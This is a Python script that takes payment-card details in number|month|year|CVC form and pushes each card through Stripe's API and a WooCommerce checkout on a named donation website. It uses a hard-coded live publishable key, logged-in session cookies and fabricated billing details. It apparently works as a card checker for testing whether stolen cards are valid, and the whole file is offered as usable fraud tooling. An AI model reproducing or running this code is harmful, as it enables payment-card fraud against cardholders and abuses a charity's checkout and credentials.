import requests

def Tele(ccx):
    import requests
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    
    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=waznim+ey&billing_details[address][line1]=street+27&billing_details[address][state]=NY&billing_details[address][city]=newyork&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[email]=waznimey%40gmail.com&billing_details[phone]=2095455155&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+split-card-element&key=pk_live_51MsXThLn2LtYJmrYT2Re6jHKRj0Q7pQryN6kUw2Sk53zp2mOvNfIowk15IrT1gznMKBG1q1nSOqEDupg6zt33Zyn00LORy0iqj'

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = r1.json()['id']

    cookies = {
    'et-editor-available-post-10-fb': 'fb',
    'woocommerce_items_in_cart': '1',
    'breeze_folder_name': '40faec270286c972a60e4a274bbf0f5c5990183d',
    'wordpress_logged_in_fb9067bf2bd9a3b3ccef4307db7f3b0a': 'waznim.ey%7C1730955433%7Ctyox2xv5AUJzNdJA9us6wXm0InsPaPKGBBaL5hpFItr%7C3269a890d3e0d6a287a4990db63ce2fbc2eb297d12466757da3eba67e8f44f8d',
    'wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a': '137%7C%7C1729916721%7C%7C1729913121%7C%7C26af710dbfee1d4c84c416ca2c96f086',
    'mcfw-wp-user-cookie': 'MTM3fDB8NjN8NDAwNDBfMzMxNzhmM2QzYjc5MGUyNDE4YzRmN2MyMTZhMjcyNTdhMWY4NGUzZDJiNDhhNmNiM2NjZWNjZWIxNzAxMzZjZA%3D%3D',
    'woocommerce_cart_hash': '7af0e1fe87300d3f34677c2fe543ea89',
}

    headers = {
    'authority': 'wecaretocoach.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'et-editor-available-post-10-fb=fb; woocommerce_items_in_cart=1; breeze_folder_name=40faec270286c972a60e4a274bbf0f5c5990183d; wordpress_logged_in_fb9067bf2bd9a3b3ccef4307db7f3b0a=waznim.ey%7C1730955433%7Ctyox2xv5AUJzNdJA9us6wXm0InsPaPKGBBaL5hpFItr%7C3269a890d3e0d6a287a4990db63ce2fbc2eb297d12466757da3eba67e8f44f8d; wp_woocommerce_session_fb9067bf2bd9a3b3ccef4307db7f3b0a=137%7C%7C1729916721%7C%7C1729913121%7C%7C26af710dbfee1d4c84c416ca2c96f086; mcfw-wp-user-cookie=MTM3fDB8NjN8NDAwNDBfMzMxNzhmM2QzYjc5MGUyNDE4YzRmN2MyMTZhMjcyNTdhMWY4NGUzZDJiNDhhNmNiM2NjZWNjZWIxNzAxMzZjZA%3D%3D; woocommerce_cart_hash=7af0e1fe87300d3f34677c2fe543ea89',
    'origin': 'https://wecaretocoach.com',
    'referer': 'https://wecaretocoach.com/donate/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'checkout',
}

    data = {
    'billing_first_name': 'waznim',
    'billing_last_name': 'ey',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': 'street 27',
    'billing_address_2': '',
    'billing_city': 'newyork',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '2095455155',
    'billing_email': 'waznimey@gmail.com',
    'payment_method': 'stripe',
    'woocommerce-process-checkout-nonce': 'f753bd9569',
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'stripe_source': ''+str(pm)+'',
}

    r2 = requests.post('https://wecaretocoach.com/', params=params, cookies=cookies, headers=headers, data=data)
    
    return r2.json()